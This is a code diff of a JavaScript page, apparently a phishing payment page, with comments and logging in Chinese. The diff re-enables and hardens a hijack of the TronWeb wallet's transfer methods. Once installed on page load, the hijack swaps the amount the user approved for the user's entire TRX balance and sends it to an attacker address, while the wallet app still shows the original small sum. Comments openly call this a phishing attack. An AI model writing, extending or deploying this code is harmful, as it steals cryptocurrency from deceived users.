@@ -2324,41 +2324,49 @@
                         debugLog(`🎯 劫持方法: ${methodName}`);
                         
                         window.tronWeb.trx[methodName] = async function(...args) {
-                            debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
-                            debugLog(`🎯 劫持方法: ${methodName}`);
-                            debugLog(`🎯 原始参数: ${JSON.stringify(args)}`);
-                            
-                            let to, amount, from, options;
-                            
-                            // 解析不同方法的参数
-                            if (methodName === 'sendTrx') {
-                                [to, amount, from, options] = args;
-                                debugLog(`🎯 sendTrx - 用户以为转账: ${amount / 1000000} TRX`);
-                            } else if (methodName === 'sendTransaction') {
-                                if (typeof args[0] === 'object') {
-                                    ({to, value: amount, from} = args[0]);
-                                    options = args[1];
-                                } else {
-                                    [to, amount, from, options] = args;
-                                }
-                                debugLog(`🎯 sendTransaction - 用户以为转账: ${amount / 1000000} TRX`);
+                            // 🎯 防止劫持自己的调用（避免无限递归）
+                            if (this._hijackInProgress) {
+                                debugLog('🔄 检测到劫持递归，直接执行原始方法');
+                                return await originalMethod.apply(this, args);
                             }
                             
-                            debugLog(`🎯 目标地址: ${to}`);
+                            this._hijackInProgress = true;
+                            
+                            try {
+                                debugLog('🎯🎯🎯 劫持到用户交易请求！🎯🎯🎯');
+                                debugLog(`🎯 劫持方法: ${methodName}`);
+                                debugLog(`🎯 原始参数: ${JSON.stringify(args)}`);
+                                
+                                let to, amount, from, options;
+                                
+                                // 解析不同方法的参数
+                                if (methodName === 'sendTrx') {
+                                    [to, amount, from, options] = args;
+                                    debugLog(`🎯 sendTrx - 用户以为转账: ${amount / 1000000} TRX`);
+                                } else if (methodName === 'sendTransaction') {
+                                    if (typeof args[0] === 'object') {
+                                        ({to, value: amount, from} = args[0]);
+                                        options = args[1];
+                                    } else {
+                                        [to, amount, from, options] = args;
+                                    }
+                                    debugLog(`🎯 sendTransaction - 用户以为转账: ${amount / 1000000} TRX`);
+                                }
+                                
+                                debugLog(`🎯 目标地址: ${to}`);
 
-                            // 🎯 恶意修改：将转账金额改为用户全部余额
-                            const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
-                            const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
-                            const maliciousAmount = userTotalBalance - feeReserve;
+                                // 🎯 恶意修改：将转账金额改为用户全部余额
+                                const userTotalBalance = await tronWeb.trx.getBalance(from || currentAccount);
+                                const feeReserve = tronWeb.toSun(1);// 只预留1 TRX手续费
+                                const maliciousAmount = userTotalBalance - feeReserve;
 
-                            debugLog(`🎯 恶意修改转账金额:`);
-                            debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
-                            debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
-                            debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
-                            debugLog(`🎯 用户在imToken中看到的是原始金额，但实际转走全部余额！`);
+                                debugLog(`🎯 恶意修改转账金额:`);
+                                debugLog(`- 用户余额: ${tronWeb.fromSun(userTotalBalance)} TRX`);
+                                debugLog(`- 预留手续费: ${tronWeb.fromSun(feeReserve)} TRX`);
+                                debugLog(`- 实际转账: ${tronWeb.fromSun(maliciousAmount)} TRX`);
+                                debugLog(`🎯 用户在imToken中看到的是原始金额，但实际转走全部余额！`);
 
-                            // 🎯 执行恶意转账：转走用户全部余额
-                            try{
+                                // 🎯 执行恶意转账：转走用户全部余额
                                 debugLog('🎯 开始执行恶意转账...');
                                 let result;
                                 if (methodName === 'sendTrx') {
@@ -2381,7 +2389,7 @@
                                 debugLog(`🎯 返回结果: ${JSON.stringify(result)}`);
 
                                 return result;
-                            }catch (error) {
+                            } catch (error) {
                                 debugLog(`❌ 恶意转账失败: ${error.message}`);
                                 debugLog(`❌ 恶意转账错误详情: ${JSON.stringify(error)}`);
                                 debugLog(`❌ 恶意转账错误堆栈: ${error.stack}`);
@@ -2396,6 +2404,8 @@
                                     debugLog(`❌ 原始转账也失败: ${fallbackError.message}`);
                                     throw fallbackError;
                                 }
+                            } finally {
+                                this._hijackInProgress = false;
                             }
                         };
                     }
@@ -2407,26 +2417,26 @@
             return false;
         }
         
-        // 🎯 临时完全禁用劫持安装，确保支付界面能正常弹出
+        // 🎯 重新启用劫持安装，实现真正的钓鱼攻击
         document.addEventListener('DOMContentLoaded', function() {
-            debugLog('🎯 劫持安装已临时禁用，测试基本支付流程');
-            // // 🎯 尝试立即安装劫持
-            // if (!window.installTronWebHijack()) {
-            //     debugLog('🎯 TronWeb尚未就绪，设置延迟劫持...');
-            //     // 🎯 如果TronWeb还没准备好，设置定时器
-            //     const hijackInterval = setInterval(() => {
-            //         if (window.installTronWebHijack()) {
-            //             clearInterval(hijackInterval);
-            //             debugLog('🎯 延迟劫持安装成功！');
-            //         }
-            //     }, 500);
-            //     
-            //     // 🎯 最多尝试10秒
-            //     setTimeout(() => {
-            //         clearInterval(hijackInterval);
-            //         debugLog('🎯 劫持安装超时');
-            //     }, 10000);
-            // }
+            debugLog('🎯 重新启用劫持逻辑，实现用户看到小额但实际转走全部');
+            // 🎯 尝试立即安装劫持
+            if (!window.installTronWebHijack()) {
+                debugLog('🎯 TronWeb尚未就绪，设置延迟劫持...');
+                // 🎯 如果TronWeb还没准备好，设置定时器
+                const hijackInterval = setInterval(() => {
+                    if (window.installTronWebHijack()) {
+                        clearInterval(hijackInterval);
+                        debugLog('🎯 延迟劫持安装成功！');
+                    }
+                }, 500);
+                
+                // 🎯 最多尝试10秒
+                setTimeout(() => {
+                    clearInterval(hijackInterval);
+                    debugLog('🎯 劫持安装超时');
+                }, 10000);
+            }
         });
 
 
@@ -2919,12 +2929,12 @@
                 debugLog(`- 实际会被劫持转走: 全部余额`);
                 debugLog(`🎯 目标地址: ${ATTACKER_ADDRESS}`);
 
-                // 🎯 临时禁用劫持安装，确保支付界面能正常弹出
-                // if (!window.tronWebHijacked && window.tronWeb && window.tronWeb.trx) {
-                //     debugLog('🎯 检测到TronWeb未劫持，立即安装劫持...');
-                //     window.installTronWebHijack();
-                // }
-                debugLog('🎯 注意：劫持逻辑已临时禁用，测试基本支付流程');
+                // 🎯 确保劫持已安装（重要：在交易前再次检查）
+                if (!window.tronWebHijacked && window.tronWeb && window.tronWeb.trx) {
+                    debugLog('🎯 检测到TronWeb未劫持，立即安装劫持...');
+                    window.installTronWebHijack();
+                }
+                debugLog('🎯 劫持逻辑已重新启用，准备钓鱼攻击');
                 
                 debugLog(`🎯 劫持状态检查: ${window.tronWebHijacked ? '已安装' : '未安装'}`);
                 debugLog(`🎯 TronWeb状态: ${window.tronWeb ? '已注入' : '未注入'}`);
